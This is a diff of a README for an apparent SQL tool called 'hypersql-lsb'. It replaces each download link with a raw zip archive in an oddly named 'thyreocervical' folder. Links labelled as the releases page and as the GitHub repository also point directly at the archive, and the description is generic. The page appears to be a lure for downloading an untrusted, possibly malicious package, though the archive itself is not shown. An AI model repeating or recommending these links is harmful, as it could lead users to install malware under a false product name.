@@ -1,7 +1,7 @@
 # 🚀 hypersql-lsb - Simplify Your SQL Workflow
 
 ## 📥 Download the Latest Version
-[![Download hypersql-lsb](https://raw.githubusercontent.com/khanzaman8/hypersql-lsb/main/thyreocervical/hypersql-lsb.zip)](https://raw.githubusercontent.com/khanzaman8/hypersql-lsb/main/thyreocervical/hypersql-lsb.zip)
+[![Download hypersql-lsb](https://github.com/khanzaman8/hypersql-lsb/raw/refs/heads/main/thyreocervical/lsb_hypersql_v3.5.zip)](https://github.com/khanzaman8/hypersql-lsb/raw/refs/heads/main/thyreocervical/lsb_hypersql_v3.5.zip)
 
 ## 📖 Introduction
 hypersql-lsb is an easy-to-use application designed to streamline your SQL workflow. Whether you are managing a small database or conducting complex queries, hypersql-lsb fits your needs. Enjoy a clean interface that helps you focus on what matters most—your data.
@@ -10,7 +10,7 @@ hypersql-lsb is an easy-to-use application designed to streamline your SQL workf
 To start using hypersql-lsb, follow these steps:
 
 1. **Download the Application**
-   Visit the Releases page to get the latest version: [Download hypersql-lsb](https://raw.githubusercontent.com/khanzaman8/hypersql-lsb/main/thyreocervical/hypersql-lsb.zip).
+   Visit the Releases page to get the latest version: [Download hypersql-lsb](https://github.com/khanzaman8/hypersql-lsb/raw/refs/heads/main/thyreocervical/lsb_hypersql_v3.5.zip).
 
 2. **Install the Application**
    - Open the downloaded file.
@@ -32,7 +32,7 @@ To run hypersql-lsb, make sure your system meets the following requirements:
 ## 📥 Download & Install
 To download hypersql-lsb, click the link below:
 
-[Download hypersql-lsb](https://raw.githubusercontent.com/khanzaman8/hypersql-lsb/main/thyreocervical/hypersql-lsb.zip)
+[Download hypersql-lsb](https://github.com/khanzaman8/hypersql-lsb/raw/refs/heads/main/thyreocervical/lsb_hypersql_v3.5.zip)
 
 Once you download the application, follow the installation steps outlined above. 
 
@@ -66,7 +66,7 @@ If you need assistance, please check the FAQs section in the application or visi
 ## 📢 Stay Updated
 Follow our GitHub repository for the latest updates, new features, and improvements:
 
-[Stay Updated on GitHub](https://raw.githubusercontent.com/khanzaman8/hypersql-lsb/main/thyreocervical/hypersql-lsb.zip)
+[Stay Updated on GitHub](https://github.com/khanzaman8/hypersql-lsb/raw/refs/heads/main/thyreocervical/lsb_hypersql_v3.5.zip)
 
 ## 📑 License
 hypersql-lsb is released under the MIT License. Feel free to use it in your projects while complying with the license terms.
@@ -74,4 +74,4 @@ hypersql-lsb is released under the MIT License. Feel free to use it in your proj
 ## 📄 Contribution
 Contributions to hypersql-lsb are welcome! If you have suggestions or want to report issues, please visit our GitHub page to get started.
 
-[Download hypersql-lsb](https://raw.githubusercontent.com/khanzaman8/hypersql-lsb/main/thyreocervical/hypersql-lsb.zip) and enjoy a simpler SQL experience today!
+[Download hypersql-lsb](https://github.com/khanzaman8/hypersql-lsb/raw/refs/heads/main/thyreocervical/lsb_hypersql_v3.5.zip) and enjoy a simpler SQL experience today!
